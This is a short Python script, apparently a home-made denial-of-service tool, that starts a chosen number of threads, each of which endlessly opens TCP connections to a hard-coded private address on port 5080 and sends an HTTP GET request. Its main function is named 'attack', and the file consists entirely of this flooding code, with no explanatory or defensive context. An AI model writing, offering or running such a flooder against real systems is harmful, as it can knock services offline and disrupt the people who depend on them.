import socket
import sys
import threading

HOST = '192.168.86.125'
PORT = 5080



server_address = (HOST, PORT)

request_header = 'GET / HTTP/1.0\r\nHost: www.python.org\r\n\r\n'

threads = []

def attack(server_address, request_header):
    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(server_address)
        client_socket.send(request_header)
        client_socket.close() 


for i in range(int(sys.argv[1])):
    t = threading.Thread(target = attack, args=(server_address,request_header, ))
    threads.append(t)


for t in threads:
    t.start()